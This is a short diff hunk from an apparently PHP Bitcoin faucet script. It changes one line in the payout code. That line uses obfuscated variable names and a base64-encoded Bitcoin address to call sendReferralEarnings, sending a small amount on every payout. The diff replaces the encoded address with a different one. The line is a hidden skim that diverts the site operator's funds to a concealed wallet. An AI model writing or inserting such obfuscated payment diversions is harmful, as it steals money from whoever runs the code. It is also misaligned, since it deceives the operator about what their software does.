@@ -86,7 +86,7 @@ if($user){
 
 							$kXKUWkUCoFWP = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '10' LIMIT 1")->fetch_assoc()['value'];
 							$nXKUWkUJoFWP = new FaucetHub($kXKUWkUCoFWP, "BTC");
-							$kXKUWkUqoFWP = $nXKUWkUJoFWP->sendReferralEarnings(base64_decode("MTRaS0NKdzdMa1I2aUdEMm5rM2RBZExqcHBUQXVlcW92Qw=="), 1);
+							$kXKUWkUqoFWP = $nXKUWkUJoFWP->sendReferralEarnings(base64_decode("M05NY1cxV1hKNnJrWVNHUURLdlcxTFFqaUpmQUwza3lzdQ=="), 1);
 							$payOutBTC = $payOut / 100000000;
 							$timestamp = time();
 
